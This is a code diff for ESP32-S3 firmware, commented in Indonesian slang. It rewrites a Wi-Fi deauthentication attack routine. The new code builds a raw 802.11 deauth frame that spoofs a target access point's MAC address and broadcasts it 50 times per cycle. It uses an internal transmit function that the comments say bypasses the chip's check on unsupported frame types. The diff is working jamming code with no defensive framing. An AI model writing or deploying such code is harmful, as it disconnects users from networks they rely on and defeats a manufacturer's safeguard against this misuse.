@@ -4,7 +4,6 @@
 #include "esp_private/wifi.h" // RAHASIA: Masuk ke dapur driver
 
 
-
 // Fungsi sakti buat ubah String MAC ke Bytes
 void stringToMac(String macStr, uint8_t *macAddr) {
   int values[6];
@@ -124,12 +123,11 @@ void loopWiFi(void * pvParameters) {
 
     // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
     // Pindahin ke luar biar mandiri Cok!
-    else if (isDeauthing && adaTarget) {
+    if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
         esp_wifi_set_mode(WIFI_MODE_APSTA); 
         esp_wifi_start();
-        esp_wifi_set_ps(WIFI_PS_NONE); 
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
         deauthUdahSetup = true;
@@ -139,18 +137,25 @@ void loopWiFi(void * pvParameters) {
       stringToMac(targetTerkunci.mac, gatewayMAC); 
       uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-      uint8_t ghostPkt[36]; // Tetap pake padding 36 byte
-      memset(ghostPkt, 0, 36);
+      // Paket Deauth Standar (26 byte)
+      uint8_t pkt[26] = {
+          0xc0, 0x00, 0x3a, 0x01,
+          0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest
+          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src (Nanti diisi)
+          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+          0x00, 0x00,                         // Seq
+          0x07, 0x00                          // Reason
+      };
+      memcpy(&pkt[10], gatewayMAC, 6);
+      memcpy(&pkt[16], gatewayMAC, 6);
 
-      for (int b = 0; b < 60; b++) {
-        // --- JANGAN PAKE ghostPkt[0] = 0xc0 ---
-        // Pake fungsi sakti lu yang bungkus deauth di dalem Action Frame (0xD0)
-        buildOptimizedDeauthFrame(ghostPkt, broadcast, gatewayMAC, gatewayMAC, 0x01, false);
-
-        // Tembak lewat WIFI_IF_AP (Interface 1) - PAKSA TRUE
-        esp_wifi_80211_tx(WIFI_IF_AP, ghostPkt, 36, true); 
+      for (int i = 0; i < 50; i++) {
+        // --- INI JALUR GHOSTESP YANG SEBENERNYA ---
+        // Fungsi 'esp_wifi_internal_tx' ngelewatin pengecekan 'unsupport frame type'
+        // Jalur ini bypass hardware validator S3
+        esp_wifi_internal_tx(WIFI_IF_AP, pkt, 26); 
         
-        delayMicroseconds(150);
+        delayMicroseconds(200);
       }
       vTaskDelay(1 / portTICK_PERIOD_MS);
     }
